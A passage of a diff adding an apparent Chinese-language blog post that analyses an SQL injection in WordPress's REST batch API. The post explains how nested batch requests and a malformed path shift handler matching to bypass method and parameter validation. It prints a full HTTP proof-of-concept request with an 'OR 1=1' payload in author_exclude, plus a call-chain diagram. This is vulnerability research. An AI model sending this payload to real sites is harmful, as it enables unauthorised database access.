+				<span class="keyword">return</span> <span class="keyword">array</span>( <span class="variable">$route</span>, <span class="variable">$handler</span> );
+			&#125;
+		&#125;
+
+		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WP_Error</span>(...);
+	&#125;</code></pre>
+<p>大概就是把全局已经注册的路由和这里对应上呢</p>
+<p>这里callback GET调用的就是<code>get_items</code>，此时就会触发Wp_Query对象的实例化以及对query函数的调用</p>
+<p>我们仔细看看<code>get_items</code>的实现，会发现一个很恐怖的问题</p>
+<p>callback的函数对处理的request是<strong>完全信任的</strong>，除了只检查 orderby/include 前置条件和 <code>context=edit</code> 权限</p>
+<p>对于其他的参数几乎不做校验，接近于直接处理body了</p>
+<p>但是这样可以跑通了吗?</p>
+<p>好像不行呢。。我们发现<code>/v1/batch</code>路由对请求体的request method做了严格的校验</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025222007715.png" alt="image-20261025222007715"></p>
+<p>这里的校验还是在<code>sanitize_params</code>中</p>
+<p>在这里有检测<code>enum</code>的分支</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026015009459.png" alt="image-20261026015009459"></p>
+<p>直接无法通过</p>
+<p>那么我们就要想办法绕过它去做GET的请求</p>
+<p>这里感觉也是作者<s>和他的AI</s>最天才的地方啊，使用一个嵌套去做绕过</p>
+<pre><code class="highlight plaintext">POST /wp-json/batch/v1 HTTP/1.1
+Host: localhost
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 656
+
+&#123;
+  &quot;requests&quot;: [
+    &#123;
+      &quot;method&quot;: &quot;POST&quot;,
+      &quot;path&quot;: &quot;http://:&quot;
+    &#125;,
+    &#123;
+      &quot;method&quot;: &quot;POST&quot;,
+      &quot;path&quot;: &quot;/wp/v2/posts&quot;,
+      &quot;body&quot;: &#123;
+        &quot;requests&quot;: [
+          &#123;
+            &quot;method&quot;: &quot;GET&quot;,
+            &quot;path&quot;: &quot;http://:&quot;
+          &#125;,
+          &#123;
+            &quot;method&quot;: &quot;DELETE&quot;,
+            &quot;path&quot;: &quot;/wp/v2/posts/1&quot;,
+            &quot;body&quot;: &#123;
+              &quot;author_exclude&quot;: &quot;0) OR 1=1 -- &quot;
+            &#125;
+          &#125;,
+          &#123;
+            &quot;method&quot;: &quot;GET&quot;,
+            &quot;path&quot;: &quot;/wp/v2/posts&quot;
+          &#125;
+        ]
+      &#125;
+    &#125;,
+    &#123;
+      &quot;method&quot;: &quot;POST&quot;,
+      &quot;path&quot;: &quot;/batch/v1&quot;
+    &#125;
+  ]
+&#125;</code></pre>
+<p>此时顶层 POST /batch/v1 经 dispatch 的 batch schema 校验合法进入回调 <code>serve_batch_request_v1</code></p>
+<p>outer[0] 的 URL 解析失败使 <code>$matches</code> 错位一格，outer[1] 借到 outer[2] 匹配的 <code>/batch/v1</code> handler，其 body 里前面作为未知参数被<code>sanitize</code>放行的内层 batch 被当作批处理输入再跑一轮——<strong>这层绕过的是 method 枚举</strong>（枚举只存在于顶层路由的 schema，内层信封结构无 schema）</p>
+<p>内层子请求各自在循环二绑上自己匹配到的 schema，inner[1]（DELETE /wp/v2/posts/1）由于绑定的 delete_item schema 不认识 <code>author_exclude</code>在校验中直接进行了保留</p>
+<p>内层同样的错位让 inner[1] 在执行时借到 inner[2] 的 <code>get_items</code> 匹配 → <strong>这层绕过的是参数校验</strong>（配对不一致）； <code>get_items</code> 读走DELETE body里未清洗的标量 <code>author_exclude</code> → 映射 <code>author__not_in</code> → 实例化 <code>WP_Query</code> → <code>query()</code> → <code>get_posts()</code> 的“仅数组消毒”分支原样拼接 → <code>$wpdb-&gt;get_results()</code> 注入达成。</p>
+<p>最后让AI 搓了个直观点的gadgets方便大家理解</p>
+<pre><code class="highlight plaintext">HTTP POST /wp-json/batch/v1   body: &#123; requests: [outer0, outer1, outer2] &#125;
+│
+├─ rest_api_loaded()
+└─ serve_request( &#x27;/batch/v1&#x27; )                      ① 唯一 HTTP 入口
+   └─ dispatch()                                     (435 行)
+      ├─ match_request_to_handler()                  绑 batch schema
+      ├─ has_valid_params / sanitize_params          顶层枚举校验：outer 三个子请求都是 POST ✓
+      └─ respond_to_request()
+         └─ call_user_func( serve_batch_request_v1 )  (1287 行)
+            │
+            ▼
+   serve_batch_request_v1()                    ②【第一次调用】正常路径：路由回调
+   │  循环一：outer[0] &quot;http://:&quot; 解析失败 → $requests[0]=WP_Error（错位的种子）
+   │  循环二：matches[0]=match(outer[1])=posts create_item
+   │          matches[1]=match(outer[2])=/batch/v1 handler   ← outer[2] 是&quot;捐赠者&quot;
+   │  循环三：i=1 → $matches[1] 取到 outer[2] 的匹配 = /batch/v1 handler
+   │     → respond_to_request( outer[1], &#x27;/batch/v1&#x27;, batch_handler, null )
+   │        └─ call_user_func( serve_batch_request_v1 )      (又是 1287 行)
+   │           │
+   │           ▼
+   │     serve_batch_request_v1( outer[1] )   ③【第二次调用】借位重入（递归）
+   │        读 outer[1] body 里的 requests → 内层 batch（从未被枚举校验，GET/DELETE 随意）
+   │        循环三：inner[1] 借到 inner[2] 的 get_items 匹配
+   │           → call_user_func( get_items )   ④ SQLi 落地
+   │        → 返回内层响应数组
+   │
+   │  返回 207 WP_REST_Response
+   └─ serve_request 后半段：json_encode + echo（唯一一次 I/O）</code></pre>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
+        <span>微信</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Audit/" rel="tag"># Audit</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/24/How-Agent-use-MCP/" rel="prev" title="How Agent use MCP">
+                  <i class="fa fa-angle-left"></i> How Agent use MCP
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">AyaN0</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">442k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">13:24</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
